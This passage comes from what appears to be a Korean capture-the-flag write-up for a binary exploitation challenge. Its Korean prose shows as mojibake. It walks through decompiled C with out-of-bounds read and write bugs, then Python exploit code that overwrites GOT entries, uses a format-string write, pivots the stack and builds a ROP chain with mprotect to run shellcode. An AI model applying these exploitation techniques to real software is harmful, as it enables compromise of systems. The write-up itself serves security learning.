packet&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">17</span> &amp;&amp; *buf == <span class="string">&#x27;Z&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="number">8</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] )<span class="comment">// ÎßàÏßÄÎßâ Î∞îÏù¥Ìä∏ Í≤ÄÏÇ¨</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(buf[<span class="number">1</span>]);</span><br><span class="line">    idx1 = *(buf + <span class="number">2</span>);</span><br><span class="line">    idx2 = *(buf + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( idx1 &lt;= <span class="number">18</span> &amp;&amp; idx2 &lt;= <span class="number">18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = qword_404088;</span><br><span class="line">      *(buf + <span class="number">0x12</span>) = global_alphabet;</span><br><span class="line">      *(buf + <span class="number">26</span>) = v2;</span><br><span class="line">      <span class="built_in">strcpy</span>(buf + <span class="number">34</span>, <span class="string">&quot;qrstuvwxyz&quot;</span>);</span><br><span class="line">      *ptr = *&amp;buf[idx1 + <span class="number">18</span>];                  <span class="comment">// oob read</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Grabbed new alphabet characters: %s\n&quot;</span>, ptr);</span><br><span class="line">      *&amp;buf[idx2 + <span class="number">18</span>] = *ptr;                  <span class="comment">// oob write</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Placed new letters into alphabet&quot;</span>);</span><br><span class="line">      v3 = *(buf + <span class="number">26</span>);</span><br><span class="line">      global_alphabet = *(buf + <span class="number">18</span>);            <span class="comment">// bss ÏòÅÏó≠Ïóê Îç∞Ïù¥ÌÑ∞ Ïì∞Í∏∞ Í∞ÄÎä•</span></span><br><span class="line">      qword_404088 = v3;</span><br><span class="line">      qword_404090 = *(buf + <span class="number">34</span>);</span><br><span class="line">      word_404098 = *(buf + <span class="number">21</span>);</span><br><span class="line">      byte_40409A = buf[<span class="number">44</span>];</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Updated the alphabet&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;An index is too big&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;                                               <span class="comment">// ___stack_chk_fail@got -&gt; ret</span></span><br></pre></td></tr></table></figure><p>Ï≤òÏùå ifÎ¨∏ÏúºÎ°ú Ïù¥Í≤ÉÏ†ÄÍ≤É Í≤ÄÏÇ¨ÌïúÎã§. ÏûÖÎ†•Í∞íÏùò Ï≤´ Í∏ÄÏûêÎäî <code>Z</code>Ïó¨Ïïº ÌïúÎã§. Îëê Î≤àÏß∏ Í∏ÄÏûêÎäî <code>\x08</code>Ïù¥Ïñ¥Ïïº ÌïúÎã§. Í∑∏Î¶¨Í≥† <code>calc_checksum</code> Ìï®ÏàòÎ°ú ÏûÖÎ†•Í∞íÏùò ÎßàÏßÄÎßâ Í∏ÄÏûêÎ•º Í≤ÄÏÇ¨ÌïòÍ≥† ÏûàÎã§. ÏùµÏä§ ÏΩîÎìú Ïß§ Îïå pythonÏúºÎ°ú <code>calc_checksum</code> Ìï®ÏàòÎ•º Íµ¨ÌòÑÌï¥ÏÑú ÎßàÏßÄÎßâ Í∏ÄÏûê Ìïú Î∞îÏù¥Ìä∏Î•º ÎÑ£Ïñ¥Ï£ºÏûê. Í∑∏ Îã§Ïùå Í∏ÄÏûêÎäî <code>buf</code>Ïùò indexÎ°ú ÏÇ¨Ïö©ÌïòÍ≥† ÏûàÍ≥†, ÎßàÏßÄÎßâÏóêÎäî <code>bss</code> ÏòÅÏó≠Ïóê Í∞íÏùÑ Î≥µÏÇ¨Ìï¥Ï£ºÍ≥† ÏûàÎã§. payloadÎ•º Î≥¥ÎÇ¥ÏïºÌïòÎäî ÌòïÏãùÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§. (Íµ¨Ï°∞Ï≤¥ Ï†ïÎ¶¨)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(idx1, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(idx2, signed=<span class="literal">True</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br></pre></td></tr></table></figure><p><code>idx1</code>Í≥º <code>idx2</code> ÌÅ¨Í∏∞ Ï†úÌïúÏùÑ ÌïòÍ≥† ÏûàÎäîÎç∞, ÏùåÏàòÎäî Ï†úÌïúÌïòÏßÄ ÏïäÏïÑ oobÎ•º ÏùòÏã¨Ìï† Ïàò ÏûàÎã§. (Í∑∏ÎûòÏÑú ÏúÑÏùò Íµ¨ÌòÑÏóêÏÑú <code>signed=True</code>Î•º ÏÇ¨Ïö©ÌñàÎã§.)</p><p>Ïù¥Ï†ú Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÏïÑÎ≥¥Ïûê. <code>*ptr = *&amp;buf[idx1 + 18];</code> Ïù¥ ÎùºÏù∏ÏúºÎ°ú <code>*ptr</code>ÏùÑ Ï†ïÏùòÌï¥Ï£ºÎäîÎç∞ Î∞îÎ°ú ÏïÑÎûò Ï§ÑÏóêÏÑú <code>printf</code>Î°ú <code>ptr</code>ÏùÑ Ï∂úÎ†•Ìï¥Ï£ºÍ∏∞ ÎïåÎ¨∏Ïóê Ïä§ÌÉùÏóê ÏûàÎäî Ï£ºÏÜåÎ•º leakÌï† Ïàò ÏûàÎã§.(oob read) Í∑∏Î¶¨Í≥† <code>*&amp;buf[idx2 + 18] = *ptr;</code> Ïù¥ ÎùºÏù∏ÏùÑ ÌÜµÌï¥ oob writeÍ∞Ä Î∞úÏÉùÌï† Ïàò ÏûàÎã§. Ïûê. Ïù¥ Îëê Ï∑®ÏïΩÏ†êÏù¥ Î∞úÏÉùÌï† Ïàò ÏûàÎäî Ïù¥Ïú†Îäî <code>idx1</code>ÏôÄ <code>idx2</code>Í∞Ä Ïö∞Î¶¨Ïùò ÏûÖÎ†•Í∞íÏù¥Í≥†, Ïù¥ ÏûÖÎ†•Í∞í Ïù∏Îç±Ïä§Î•º Í≤ÄÏ¶ùÌïòÏßÄ ÏïäÏïÑÏÑú <code>buf</code>ÏóêÏÑú Î≤óÏñ¥ÎÇú Í≥≥Ïóê Ï†ëÍ∑ºÌï† Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. </p><p>oob writeÎäî ÏùµÏä§Ìï† Îïå ÏïÑÎûòÏ≤òÎüº Íµ¨ÌòÑÌï¥ÏÑú ÏÇ¨Ïö©ÌñàÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18 = addr</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawbÎäî Ìïú Î∞îÏù¥Ìä∏Ïî© ÏçºÏßÄÎßå aawÎäî aawbÎ•º Ìò∏Ï∂úÌï¥ÏÑú 8Î∞îÏù¥Ìä∏Î•º Ïì∏ Í≤É</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*ptr = *&amp;buf[idx1 + <span class="number">18</span>];</span><br><span class="line">*&amp;buf[idx2 + <span class="number">18</span>] = *ptr;  </span><br></pre></td></tr></table></figure><p>ÏûÖÎ†•Í∞íÏù¥ <code>idx2</code>ÎãàÍπå <code>payload</code>ÏóêÏÑú <code>idx2</code>Ïóê Îì§Ïñ¥Í∞à Î∂ÄÎ∂ÑÏùÄ <code>ptr - buf - 18</code>Ïù¥Îã§. ÏúÑÏùò ÎÇ¥Í∞Ä ÎßåÎì† python Ìï®Ïàò <code>aawb</code>ÏóêÏÑúÎäî <code>ptr</code>ÏùÑ <code>addr</code>Î°ú ÏßÄÏ†ïÌñàÎã§. Ïù¥ ÏúÑÏπòÏóê Îì§Ïñ¥Í∞à Í∞íÏùÄ <code>idx1</code>Ïóê Îî∞Îùº Í≤∞Ï†ïÎêòÎäîÎç∞ Ïù¥Í≤ÉÏùÄ <code>libc</code>ÏóêÏÑú <code>/bin/sh</code> Î¨∏ÏûêÏó¥ÏùÑ Ï∞æÎäî Í≤ÉÏ≤òÎüº <code>next(libc.search(bytes([val])) - buf - 18</code>Î°ú ÏûëÏÑ±Ìï¥Ï£ºÏóàÎã§. <code>- buf - 18</code>ÏùÑ Ìï¥Ï§Ä Ïù¥Ïú†Îäî <code>idx2</code>Ïóê Îì§Ïñ¥Í∞à Í∞íÏùÑ Ï∞æÎäî Í≤ÉÍ≥º ÎèôÏùºÌïú ÏõêÎ¶¨Ïù¥Îã§. Ï∞∏Í≥†Î°ú <code>next(libc.search(bytes([val]))</code>ÏùÄ <code>libc</code>ÏóêÏÑú <code>val</code> Í∞íÏùÑ Ï∞æÎäî Í≤ÉÏù∏Îç∞, <code>val</code>ÏùÄ Ìïú Î∞îÏù¥Ìä∏Ïù¥Îã§. </p><p>Ïôú Ìïú Î∞îÏù¥Ìä∏Ïî© Ï∞æÏïÑÏÑú Í∞íÏùÑ Ïç®Ï§ÑÍπå? ÎßåÏïΩ <code>x Ï£ºÏÜå</code>Ïóê <code>0x41424344</code>Ïù¥ÎùºÎäî Í∞íÏùÑ Ïì∞Í≥† Ïã∂Îã§Í≥† ÌïòÏûê. Ïù¥Î•º ÏúÑÌï¥ÏÑú <code>0x41424344Ïù¥ Ï†ÄÏû•Îêú Ï£ºÏÜå</code>Î•º Ï∞æÏïÑÏïº ÌïúÎã§. ÌïòÏßÄÎßå Ï†Ä Í∞íÏù¥ Ï†ÄÏû•Îêú Ï£ºÏÜåÎäî Ï∞æÍ∏∞Í∞Ä ÌûòÎì§ ÏàòÎèÑ ÏûàÎã§. Í∑∏ÎûòÏÑú Ìïú Î∞îÏù¥Ìä∏Ïî© Ï∞æÏïÑ Ïç®Ï£ºÎäî Í≤ÉÏù¥Îã§. Ï†ÑÏ≤¥ Í∞íÏùÑ Ïì∞Í∏∞ ÏúÑÌï¥ÏÑú <code>aaw</code>ÎùºÎäî Ìï®ÏàòÎ•º Ï†ïÏùòÌñàÍ≥† Ïì∞Í≥† Ïã∂ÏùÄ Í∞í Í∏∏Ïù¥ÎßåÌÅº <code>aawb</code>Î•º Ìò∏Ï∂úÌï¥ÏÑú Í∞íÏùÑ Ïì¥Îã§. </p><p>Î¨∏Ï†úÏóêÏÑú <code>while(1)</code>Î°ú ÏûÖÎ†•Í∞íÏùÑ Í≥ÑÏÜç Ïì∏ Ïàò ÏûàÏñ¥ÏÑú Ïù¥ÏôÄ Í∞ôÏùÄ Î∞úÏÉÅÏù¥ Í∞ÄÎä•ÌñàÎã§.</p><p>ÎßàÏßÄÎßâÏúºÎ°ú Ïö∞Î¶¨Í∞Ä pythonÏúºÎ°ú Íµ¨ÌòÑÌï¥ÏïºÌï† <code>calc_checksum</code>Ïù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">calc_checksum</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 result; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  dest = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, buf, size);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size - <span class="number">1</span>; ++i )</span><br><span class="line">    result += *(dest + i) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="built_in">free</span>(dest);                                   <span class="comment">// free@got -&gt; printf</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xorÏùÑ Îëê Î≤àÌïòÎ©¥ ÏõêÎûòÎåÄÎ°ú ÎèåÏïÑÏò§Îäî ÏÑ±ÏßàÏùÑ Ïù¥Ïö©ÌïòÎ©¥ ÎêúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>stackÍ≥º libc baseÎ•º Íµ¨ÌïúÎã§.</li><li>ÏßÅÏ†ë Íµ¨ÌòÑÌïú <code>aaw</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ rop payloadÎ•º <code>bss</code> ÏòÅÏó≠Ïóê Ïç®Ï§ÄÎã§.</li></ol><ul><li>Ïôú Ïù¥Îü∞ payloadÎ•º ÏçºÎäîÏßÄÎäî ÏïÑÎûòÏóêÏÑú Ïù¥Ìï¥Ìï† Ïàò ÏûàÎã§.  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bssÏùò Ï†ïÏ§ëÏïô</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!)</span></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># Îëê Î≤àÏß∏ Ïä§ÌÉù ÌîºÎ¥áÌåÖ</span></span><br><span class="line"></span><br><span class="line">aaw(bss, rop_payload) </span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li><code>got</code>Îì§ÏùÑ ÎçÆÏñ¥Ï§ÄÎã§.</li></ol><ul><li><code>free@got -&gt; printf</code>, <code>__stack_chk_fail@got -&gt; ret</code>, <code>fgets@got -&gt; gets</code></li><li>Ïù¥Î•º ÏúÑÌï¥ bss ÏòÅÏó≠Ïóê <code>p64(libc.sym[&#39;gets&#39;])</code>, <code>p64(libc.sym[&#39;printf&#39;])</code>, <code>p64(ret)</code>ÏùÑ Ïç®Ï£ºÏóàÎã§. <code>(!)</code></li><li>gotÎ•º ÎçÆÏùÑ ÎïåÎäî <code>aaw</code> Ìï®ÏàòÎ•º ÏÇ¨Ïö©ÌïòÏßÄ ÏïäÍ≥† Î∞îÎ°ú paylaodÎ•º Î≥¥ÎÇ¥ÏÑú ÎçÆÏñ¥Ï£ºÏóàÎã§. (Ïì∏ ÌïÑÏöîÏÑ± Î™ª ÎäêÎÇå)</li><li>ÏôúÎÉêÌïòÎ©¥ <code>fgets@got</code>Î•º <code>gets</code> Ìï®ÏàòÎ°ú ÎçÆÏùÑ Îïå ÎßåÏïΩ Ìïú Î∞îÏù¥Ìä∏Ïî© ÎçÆÍ≤å ÎêúÎã§Î©¥ Ìïú Î∞îÌä∏Ïî© Î∞îÎÄê ÏûòÎ™ªÎêú Ï£ºÏÜåÎ•º Ìò∏Ï∂úÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.</li><li><code>fgets@got -&gt; gets</code> ÎçÆÏùÑ Îïå <code>b&#39;a&#39; * 0x12</code>ÏùÑ Ï∂îÍ∞ÄÎ°ú Î≥¥ÎÇ¥Ï£ºÏóàÎã§. ÏôúÎÉêÌïòÎ©¥ <code>free@got</code>ÏùÑ ÎçÆÏñ¥ÏÑú <code>printf</code>Î°ú ÎçÆÏñ¥ÏÑú fsbÍ∞Ä Î∞úÏÉùÌïòÎäî Í≤ÉÏùÑ ÎÖ∏Î†∏ÎäîÎç∞, ÎßåÏïΩ Ï†Ä ÎçîÎØ∏Îç∞Ïù¥ÌÑ∞Î•º Î≥¥ÎÇ¥Ï£ºÏßÄ ÏïäÏúºÎ©¥ Í∏ÄÏûêÏàòÍ∞Ä 17ÏûêÎ°ú <code>fsb</code>Î°ú Í∞íÏùÑ Ïì∞Í∏∞Ïóî ÌÑ±ÏóÜÏù¥ Î∂ÄÏ°±ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÌòπÏãúÎ™∞Îùº ÎçîÎØ∏Îç∞Ïù¥ÌÑ∞ÎèÑ Ìï®Íªò Î≥¥ÎÇ¥Ï£ºÏóàÎã§.</li></ul><p>(ÌòÑÏû¨ ÏÉÅÌô©) <code>main</code>Ìï®ÏàòÏóêÏÑú <code>fgets</code> ÎåÄÏã† <code>gets</code>Í∞Ä Ïã§ÌñâÎêòÎØÄÎ°ú <code>bof</code>Í∞Ä ÌÑ∞Ïßê! (Ïπ¥ÎÇòÎ¶¨ÎïåÎ¨∏Ïóê Ï∂îÍ∞ÄÏ†ÅÏúºÎ°ú <code>__stack_chk_fail@got</code>ÏùÑ <code>ret</code>ÏúºÎ°ú ÎçÆÏñ¥Ï§å!) <code>calc_checksum</code> Ìï®ÏàòÏóêÏÑú <code>fgets</code> Ìï®Ïàò ÎåÄÏã† <code>printf</code>Í∞Ä Ïã§ÌñâÎêòÎØÄÎ°ú <code>fsb</code>Í∞Ä ÌÑ∞Ïßê! </p><ol start="4"><li><code>fsb</code>Î•º Ïù¥Ïö©ÌïòÏó¨ <code>rbp</code>Î•º Î≥ÄÍ≤ΩÌïòÏó¨ ÌùêÎ¶ÑÏùÑ <code>bss</code> ÏòÅÏó≠ÏúºÎ°ú ÎèåÎ¶∞Îã§. Ïù¥ <code>bss</code> ÏòÅÏó≠ÏùÄ 2Î≤àÏóêÏÑú Ï†ÅÏùÄ Î∂ÄÎ∂Ñ<code>(!!)</code>Ïù¥Í≥† <code>pop_rsp</code>Î•º Ïã§ÌñâÌï† Í≤ÉÏù¥Îã§. (Ïä§ÌÉù ÌîºÎ¥áÌåÖ 1) &lt;- Ï∞∏Í≥†Î°ú Ïó¨Í∏∞ÏÑú ÌùêÎ¶ÑÏù¥ <code>bss</code> ÏòÅÏó≠ÏúºÎ°ú Î∞îÎÄåÏñ¥ÏÑú, Ï¶â <code>rbp</code>Í∞Ä <code>bss</code> ÏòÅÏó≠Ïùò Ï£ºÏÜåÎ°ú Î∞îÎÄåÏñ¥ÏÑú Ï°∞Í∏à ÏïàÏ¢ãÏùÄ ÏùºÏù¥ ÏùºÏñ¥ÎÇ† Ïàò ÏûàÎã§. Ïù¥Îäî Îß® ÎßàÏßÄÎßâÏóê Ïù¥ÏïºÍ∏∞ÌïúÎã§. <code>***</code>&gt;</li></ol><ul><li><code>fsb</code>Îäî <code>calc_checksum</code> Ìï®ÏàòÏóêÏÑú ÌÑ∞ÏßÑÎã§. Ïù¥ Ìï®ÏàòÏïàÏóêÏÑúÏùò <code>rbp</code>Îäî <code>calc_checksum</code> Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïú <code>use_packet</code>Ïùò <code>rbp</code>Í∞Ä Ï†ÄÏû•Îêú Ïä§ÌÉù Ï£ºÏÜåÏù¥Îã§. </li><li><code>buf</code>ÏôÄ ÏúÑ Ïä§ÌÉù Ï£ºÏÜåÏùò offsetÏùÄ 0x90Ïù¥Îã§.</li><li><code>0x404820</code>ÏúºÎ°ú <code>rbp</code>Î•º Î≥ÄÍ≤ΩÏãúÌÇ§Í∏∞ ÏúÑÌï¥ <code>ln</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ <code>0x20</code>ÏùÑ 8 Î∞îÏù¥Ìä∏ Ïì∞Í≥† <code>hn</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ <code>0x4048</code>ÏùÑ 2 Î∞îÏù¥Ìä∏ Ïì∞Ïûê.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># Ïù¥Í±∏ ÏïàÌïòÎ©¥ calc_checksumÏùò free(printf)Í∞Ä Ìò∏Ï∂úÏù¥ ÏïàÎê®</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!!)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># Ïã§ÌñâÌï†Ïàò ÏûàÎèÑÎ°ù Í∂åÌïú Î∞îÍøîÏ£ºÍ≥†</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># Ïó¨Í∏∞Ïóê ÏâòÏΩîÎìú ÏûÖÎ†• ÌõÑ</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># Ï†êÌîÑ</span></span><br></pre></td></tr></table></figure></li></ul><ol start="5"><li>Í∑∏Îüº Ïù¥Ï†ú ÌùêÎ¶ÑÏù¥ <code>bss</code> ÏòÅÏó≠Ïùò ÏïÑÎûò ÏΩîÎìúÎ°ú Î∞îÎÄåÎäîÎç∞, 4Î≤àÏóêÏÑú Ïä§ÌÉùÏóê Ïç®Ï§Ä ÏΩîÎìú<code>(!!!)</code>Î°ú Ïù¥ÎèôÌïúÎã§. (Ïä§ÌÉù ÌîºÎ¥áÌåÖ 2)</li><li>ÎßàÏßÄÎßâÏúºÎ°ú <code>mprotect</code> Ìï®ÏàòÎ°ú bss ÏòÅÏó≠ Ïã§ÌñâÍ∞ÄÎä•ÌïòÍ≤å ÏÑ§Ï†ïÌï¥Ï£ºÍ≥† <code>gets</code> Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêòÎãà <code>flag.txt</code> orwÌïòÎäî ÏâòÏΩîÎìúÎ•º Î≥¥ÎÇ¥Ï£ºÏûê.</li></ol><p><code>***</code> <code>calc_checksum</code> Ìï®ÏàòÏóêÏÑú <code>fsb</code>Î•º Ïù¥Ïö©ÌïòÏó¨ <code>rbp</code>Î•º <code>bss</code>ÏòÅÏó≠ÏúºÎ°ú Î∞îÍøîÏ£ºÏóàÎã§. Ïó¨Í∏∞ÍπåÏßÑ Í¥úÏ∞ÆÏùÄÎç∞ Í∑∏ Îã§Ïùå ÏûÖÎ†•ÏóêÏÑú Î¨∏Ï†úÍ∞Ä Î∞úÏÉùÌï† ÏàòÎèÑ ÏûàÎã§. (Ïã§Ï†úÎ°ú Î∞úÏÉùÌñàÎã§.) ÏßÄÍ∏à ÌùêÎ¶Ñ ÏÉÅÌô©ÏóêÏÑúÎäî ifÎ¨∏ ÏïàÏúºÎ°ú Îì§Ïñ¥Í∞ÄÎ©¥ ÏïàÎêúÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="comment">/* Ïù¥ÎØ∏ ÏßÑÌñâÎê® */</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] <span class="comment">/* ÎßàÏßÄÎßâ Î∞îÏù¥Ìä∏ Í≤ÄÏÇ¨*/</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// oob read, write Ï∑®ÏïΩÏ†êÏù¥ Î∞úÏÉùÌïòÍ≥† bss ÏòÅÏó≠Ïóê Í∞íÏùÑ ÏîÄ</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏùòÎèÑÌïòÏßÄ ÏïäÏùÄ ÏÉÅÌô©Ïù¥ Î∞úÏÉùÌï† ÏàòÎèÑ ÏûàÏúºÎØÄÎ°ú ÏùµÏä§ÌïòÎäîÎç∞ ÌïÑÏöîÌïòÏßÄ ÏïäÏùÄ ÏΩîÎìúÎäî ÏµúÎåÄÌïú Ïã§ÌñâÏãúÌÇ§ÏßÄ ÎßêÏûêÎäî ÏÉùÍ∞ÅÏùÑ Í∞ÄÏ†∏Ïïº ÌïúÎã§. ÏÇ¨Ïã§ÏÉÅ ÎßàÏßÄÎßâ Î∞îÏù¥Ìä∏ Í≤ÄÏÇ¨Îäî ÌãÄÎ¶¥ Í≤ÉÏù¥Í≥† Ï§ëÏöîÌïú Í≤ÉÏùÄ <code>buf</code>ÏôÄ <code>len</code>ÏùÑ <code>rbp</code>Î•º Í∏∞Ï§ÄÏúºÎ°ú Ï∞∏Ï°∞ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÏúÑÌóòÌïòÎã§. Í∑∏ÎûòÏÑú ÏïÑÎûò ÎÖ∏ÎûÄÏÉâÏúºÎ°ú ÏùåÏòÅÏßÑ Ï£ºÏÜåÏóêÏÑú ÌÑ∞ÏßÑÎã§.</p><img src="/images/230412-ritsecctf2023-3Alphabet/Screenshot 2023-04-12 at 20.37.20.png" 